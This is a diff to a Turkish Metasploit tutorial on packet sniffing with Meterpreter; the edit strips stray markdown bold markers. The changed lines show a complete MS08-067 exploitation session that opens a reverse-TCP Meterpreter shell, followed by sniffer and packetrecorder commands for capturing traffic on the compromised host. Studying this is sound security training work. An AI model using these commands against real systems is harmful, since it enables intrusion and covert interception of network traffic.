@@ -43,17 +43,17 @@ Meterpreter `sniffer` eklentisi MicroOLAP Packet Sniffer SDK kullanır. Paketler
 
 ```bash
 msf > use exploit/windows/smb/ms08_067_netapi
-msf exploit**(**ms08_067_netapi**)** > set PAYLOAD windows/meterpeter/reverse_tcp
-msf exploit**(**ms08_067_netapi**)** > set LHOST 10.211.55.126
-msf exploit**(**ms08_067_netapi**)** > set RHOST 10.10.1.119
-msf exploit**(**ms08_067_netapi**)** > exploit
+msf exploit(ms08_067_netapi) > set PAYLOAD windows/meterpeter/reverse_tcp
+msf exploit(ms08_067_netapi) > set LHOST 10.211.55.126
+msf exploit(ms08_067_netapi) > set RHOST 10.10.1.119
+msf exploit(ms08_067_netapi) > exploit
 
 > Handler binding to LHOST 0.0.0.0
 > Started reverse handler
 > Triggering the vulnerability...
-> Transmitting intermediate stager **for **over-sized stage...**(**216 bytes**)**
-> Sending stage **(**205824 bytes**)**
-> Meterpreter session 1 opened **(**10.10.1.4:4444 -> 10.10.1.119:1921**)**
+> Transmitting intermediate stager for **over-sized stage...(216 bytes)
+> Sending stage (205824 bytes)
+> Meterpreter session 1 opened (10.10.1.4:4444 -> 10.10.1.119:1921)
 ```
 
 
@@ -95,7 +95,7 @@ Hedef sistemde hangi ağ arayüzlerinin aktif olduğunu görmek için `sniffer_i
 ```bash
 meterpreter > sniffer_interfaces
 
-1 - 'VMware Accelerated AMD PCNet Adapter' **(** type:0 mtu:1514 usable:true dhcp:true wifi:false **)**
+1 - 'VMware Accelerated AMD PCNet Adapter' ( type:0 mtu:1514 usable:true dhcp:true wifi:false )
 ```
 
 
@@ -109,7 +109,7 @@ Bizim örneğimizde 1 adet arayüz bulunmaktadır. Bu ağ cihazını dinlemek i�
 
 ```bash
 meterpreter > sniffer_start 1
-> Capture started on interface 1 **(**200000 packet buffer**)**
+> Capture started on interface 1 (200000 packet buffer)
 ```
 
 
@@ -146,7 +146,7 @@ Meterpreter `sniffer` eklentisinin yanında paket dinleme için geliştirilen `p
 
 ```bash
 meterpreter > run packetrecorder 
-Meterpreter Script **for **capturing packets **in **to a PCAP file
+Meterpreter Script for **capturing packets **in **to a PCAP file
 on a target host given a interface ID.
 
 OPTIONS:
@@ -154,7 +154,7 @@ OPTIONS:
     -h        Help menu.
     -i   Interface ID number where all packet capture will be **done**.
     -l   Specify and alternate folder to save PCAP file.
-    -li        List interfaces that can be used **for **capture.
+    -li        List interfaces that can be used for **capture.
     -t   Time interval **in **seconds between recollection of packet, default 30 seconds.
 ```
 
@@ -166,9 +166,9 @@ Dinlemeye başlamadan önce, dinlenebilir arayüzlerin listesini kontrol edelim.
 ```bash
 meterpreter > run packetrecorder -li
 
-1 - 'Realtek RTL8139 Family PCI Fast Ethernet NIC' **(** type:4294967295 mtu:0 usable:false dhcp:false wifi:false **)**
-2 - 'Citrix XenServer PV Ethernet Adapter' **(** type:0 mtu:1514 usable:true dhcp:true wifi:false **)**
-3 - 'WAN Miniport (Network Monitor)' **(** type:3 mtu:1514 usable:true dhcp:false wifi:false **)**
+1 - 'Realtek RTL8139 Family PCI Fast Ethernet NIC' ( type:4294967295 mtu:0 usable:false dhcp:false wifi:false )
+2 - 'Citrix XenServer PV Ethernet Adapter' ( type:0 mtu:1514 usable:true dhcp:true wifi:false )
+3 - 'WAN Miniport (Network Monitor)' ( type:3 mtu:1514 usable:true dhcp:false wifi:false )
 ```
 
 
